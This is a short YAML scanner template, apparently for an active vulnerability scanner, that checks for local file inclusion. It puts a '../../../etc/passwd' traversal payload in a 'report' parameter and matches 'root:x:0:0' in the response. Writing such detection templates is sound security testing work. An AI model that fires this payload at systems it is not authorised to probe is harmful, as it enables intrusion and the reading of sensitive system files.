id: lfi7-322
name: 'Deep traversal in report'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via report'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      report:
        - '../../../etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
